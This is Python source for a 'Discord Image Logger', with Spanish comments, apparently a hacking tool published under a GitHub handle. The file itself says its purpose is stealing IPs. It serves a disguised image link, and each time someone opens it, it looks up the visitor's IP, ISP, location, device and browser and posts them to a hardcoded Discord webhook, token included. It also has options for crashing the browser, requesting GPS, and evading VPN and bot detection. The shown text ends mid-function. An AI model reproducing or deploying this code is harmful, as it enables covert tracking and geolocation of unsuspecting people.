# Image Logger
# Por Team C00lB0i/C00lB0i | https://github.com/OverPowerC
from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "Una aplicación simple que permite robar IPs y más abusando de la función 'Abrir original' de Discord"
__version__ = "v2.0"
__author__ = "C00lB0i"

config = {
    # CONFIGURACIÓN BASE
    #
    "webhook": "https://discord.com/api/webhooks/1546229226355818529/0IjhLUnVPgXxCv56-iHUWbiG7MeVkJvyQdsGHbmP222Da4Wmai-2os3HHNZWbeeEGpIV",
    "image": "https://link-a-tu-imagen.aqui",
    # También puedes tener una imagen personalizada usando un argumento URL
    # (Ejemplo: tudominio.com/imagelogger?url=)
    "imageArgument": True, # Permite usar un argumento URL para cambiar la imagen (LEE EL README)
    # PERSONALIZACIÓN
    #
    "username": "Image Logger", # Nombre que tendrá el webhook
    "color": 0x00FFFF, # Color hexadecimal para el embed (Ejemplo: Rojo es 0xFF0000)
    # OPCIONES
    #
    "crashBrowser": False, # Intenta bloquear/congelar el navegador del usuario, puede no funcionar.
    "accurateLocation": False, # Usa GPS para encontrar la ubicación exacta (dirección real, etc.) desactivado porque pide permiso al usuario.
    "message": { # Muestra un mensaje personalizado cuando el usuario abre la imagen
        "doMessage": False, # ¿Activar mensaje personalizado?
        "message": "Este navegador ha sido poseído por el Image Logger de C00lB0i. https://github.com/OverPowerC",
        "richMessage": True, # ¿Activar texto enriquecido? (Ver README)
    },
    "vpnCheck": 1, # Previene que VPNs activen la alerta
        # 0 = Sin antivpn
        # 1 = No mencionar cuando se sospeche VPN
        # 2 = No enviar alerta cuando se sospeche VPN
    "linkAlerts": True, # Alerta cuando alguien envía el enlace (puede fallar si se envía muchas veces en minutos)
    "buggedImage": True, # Muestra una imagen de carga como vista previa en Discord (puede aparecer como imagen de color en algunos dispositivos)
    "antiBot": 1, # Previene que bots activen la alerta
        # 0 = Sin antibot
        # 1 = No mencionar si es posiblemente un bot
        # 2 = No mencionar si es 100% un bot
        # 3 = No enviar alerta si es posiblemente un bot
        # 4 = No enviar alerta si es 100% un bot
    # REDIRECCIÓN
    #
    "redirect": {
        "redirect": False, # ¿Redirigir a una página web?
        "page": "https://tu-enlace.aqui" # Enlace de la página a redirigir
    },
    # Por favor, ingresa todos los valores en el formato correcto. Si no, puede romperse.
    # No edites nada debajo de esto, a menos que sepas lo que haces.
    # NOTA: El árbol de jerarquía es el siguiente:
    # 1) Redirección (si está activada, desactiva imagen y crash)
    # 2) Crash Browser (si está activado, desactiva imagen)
    # 3) Mensaje (si está activado, desactiva imagen)
    # 4) Imagen
}

blacklistedIPs = ("27", "104", "143", "164") # IPs en lista negra. Puedes poner una IP completa o el inicio para bloquear un bloque entero.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
        "username": config["username"],
        "content": "@everyone",
        "embeds": [
            {
                "title": "Image Logger - Error",
                "color": config["color"],
                "description": f"¡Ocurrió un error al intentar registrar una IP!\n\n**Error:**\n```\n{error}\n```",
            }
        ],
    })

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    bot = botCheck(ip, useragent)
    if bot:
        requests.post(config["webhook"], json = {
            "username": config["username"],
            "content": "",
            "embeds": [
                {
                    "title": "Image Logger - Enlace Enviado",
                    "color": config["color"],
                    "description": f"¡Se envió un enlace de **Image Logger** en un chat!\nPuede que recibas una IP pronto.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Plataforma:** `{bot}`",
                }
            ],
        }) if config["linkAlerts"] else None
        return
    ping = "@everyone"
    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
            return
        if config["vpnCheck"] == 1:
            ping = ""
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return
        if config["antiBot"] == 3:
            return
        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""
        if config["antiBot"] == 1:
            ping = ""
    os, browser = httpagentparser.simple_detect(useragent)
    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [
            {
                "title": "Image Logger - IP Registrada",
                "color": config["color"],
                "description": f"""**¡Un usuario abrió la imagen original!**
**Endpoint:** `{endpoint}`
**Info de IP:**
> **IP:** `{ip if ip else 'Desconocida'}`
> **Proveedor:** `{info['isp'] if info['isp'] else 'Desconocido'}`
> **ASN:** `{info['as'] if info['as'] else 'Desconocido'}`
> **País:** `{info['country'] if info['country'] else 'Desconocido'}`
> **Región:** `{info['regionName'] if info['regionName'] else 'Desconocido'}`
> **Ciudad:** `{info['city'] if info['city'] else 'Desconocido'}`
> **Coordenadas:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Aproximada' if not coords else 'Precisa, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Zona Horaria:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Móvil:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Posible' if info['hosting'] else 'Falso'}`
**Info de PC:**
> **SO:** `{os}`
> **Navegador:** `{browser}`
**User Agent:**
